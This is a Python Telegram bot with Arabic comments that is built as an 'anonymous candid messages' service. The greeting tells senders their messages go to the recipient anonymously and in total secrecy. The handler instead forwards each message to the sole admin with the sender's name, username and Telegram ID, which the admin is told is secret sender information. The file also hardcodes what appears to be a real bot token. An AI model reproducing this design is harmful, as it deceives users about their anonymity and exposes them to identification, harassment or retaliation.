
import telebot
from telebot import types
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# 1. التوكن واليوزر الخاصين ببوتك
BOT_TOKEN = "8682801321:AAEBx5KjhdYSVCZMZIJck-JgM36Osr_Bz2Y"
BOT_USERNAME = "Sarrh1bot"

# 2. الـ ID الخاص بكِ (تم التثبيت بنجاح 👑)
ADMIN_ID = 8820368378  

bot = telebot.TeleBot(BOT_TOKEN)

# قاعدة بيانات مؤقتة في الذاكرة (لكِ أنتِ فقط)
blocked_users = set() # قائمة حظر الأشخاص اللي بيزعجوكِ
messages_db = {}      # لربط الرسائل عشان زر الحظر
msg_counter = 0

# ----------------- خدعة فتح الـ Port للاستضافة -----------------
class DummyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Bot is running perfectly for Admin!")

def run_dummy_server():
    import os
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), DummyServer)
    print(f"🌍 تم تشغيل سيرفر وهمي على المنفذ: {port}")
    server.serve_forever()
# -----------------------------------------------------------

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    # رابط الاستقبال الخاص بكِ أنتِ فقط دائماً وأبداً!
    admin_share_link = f"https://t.me/{BOT_USERNAME}?start={ADMIN_ID}"

    # إذا كنتِ أنتِ من يفتح البوت (المديرة)
    if user_id == ADMIN_ID:
        welcome_text = (
            "👋 أهلاً بكِ يا مديرة البوت!\n\n"
            f"🔗 الرابط الخاص بكِ لاستقبال الرسائل هو:\n`{admin_share_link}`\n\n"
            "أي رسالة يرسلها أي مستخدم في البوت ستصلكِ هنا فوراً مع معلوماته السرية."
        )
        bot.send_message(user_id, welcome_text, parse_mode="Markdown")
        return

    # إذا كان أي شخص آخر في العالم يفتح البوت
    welcome_text = (
        "👋 أهلاً بك في بوت الصراحة والرسائل المجهولة!\n\n"
        "✍️ أرسل رسالتك الآن مباشرة، وسيتم تسليمها للمستخدم بشكل مجهول وسري تماماً:"
    )
    bot.send_message(user_id, welcome_text)

# استقبال كل الرسائل من كل الناس وتوجيهها لكِ أنتِ فقط
@bot.message_handler(func=lambda message: message.from_user.id != ADMIN_ID)
def handle_admin_only_routing(message):
    global msg_counter
    sender_id = message.from_user.id

    # التحقق إذا كان هذا الشخص محظوراً من قبلكِ
    if sender_id in blocked_users:
        bot.send_message(sender_id, "❌ عذراً، لا يمكنك إرسال رسالة لهذا المستخدم.")
        return

    if message.content_type != 'text':
        bot.send_message(sender_id, "⚠️ البوت يدعم الرسائل النصية فقط حالياً.")
        return

    msg_counter += 1
    messages_db[msg_counter] = sender_id

    # إنشاء زر الحظر التفاعلي لكِ
    markup = types.InlineKeyboardMarkup()
    block_button = types.InlineKeyboardButton(
        text="🚫 حظر هذا المستخدم", 
        callback_data=f"admintoggle_{msg_counter}"
    )
    markup.add(block_button)

    first_name = message.from_user.first_name
    username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد معرف"
    
    info_text = (
        f"📩 **وصلتك رسالة صراحة جديدة!**\n\n"
        f"💬 **الرسالة:** {message.text}\n\n"
        f"─── معلومات المُرسِل السرية ───\n"
        f"👤 **الاسم:** {first_name}\n"
        f"🔗 **المعرف:** {username}\n"
        f"🆔 **الـ ID:** `{sender_id}`"
    )

    try:
        # إرسال الرسالة لكِ أنتِ فقط
        bot.send_message(chat_id=ADMIN_ID, text=info_text, reply_markup=markup, parse_mode="Markdown")
        # طمأنة المرسل في شاته الخاص بأنها سرية
        bot.send_message(chat_id=sender_id, text="✅ تم إرسال رسالتك بنجاح وبسرية تامة!")
    except Exception as e:
        print(f"خطأ في الإرسال للآدمين: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('admintoggle_'))
def handle_admin_block(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ أنت لست مدير البوت!")
        return

    msg_id = int(call.data.split('_')[1])
    sender_id = messages_db.get(msg_id)
    
    if not sender_id:
        bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية البيانات.")
        return

    markup = types.InlineKeyboardMarkup()
    
    # فك الحظر
    if sender_id in blocked_users:
        blocked_users.remove(sender_id)
        btn = types.InlineKeyboardButton(text="🚫 حظر هذا المستخدم", callback_data=f"admintoggle_{msg_id}")
        markup.add(btn)
        
        clean_text = call.message.text.replace("\n\n🚫 [هذا المستخدم محظور حالياً]", "")
        bot.edit_message_text(chat_id=ADMIN_ID, message_id=call.message.message_id, text=clean_text, reply_markup=markup)
        bot.answer_callback_query(call.id, "🟢 تم إلغاء الحظر بنجاح!")
        
    # الحظر
    else:
        blocked_users.add(sender_id)
        btn = types.InlineKeyboardButton(text="🟢 إلغاء حظر هذا المستخدم", callback_data=f"admintoggle_{msg_id}")
        markup.add(btn)
        
        bot.edit_message_text(
            chat_id=ADMIN_ID, 
            message_id=call.message.message_id, 
            text=f"{call.message.text}\n\n🚫 [هذا المستخدم محظور حالياً]", 
            reply_markup=markup
        )
        bot.answer_callback_query(call.id, "🚫 تم حظر المستخدم!")

if __name__ == "__main__":
    print("🧹 جاري تنظيف الجلسات وحذف الـ Webhook...")
    try:
        bot.delete_webhook(drop_pending_updates=True)
    except Exception:
        pass
        
    threading.Thread(target=run_dummy_server, daemon=True).start()
    print("👑 البوت يعمل الآن بنظام المالك الحصري (لكِ أنتِ فقط وكل شيء سري)...")
    bot.infinity_polling()
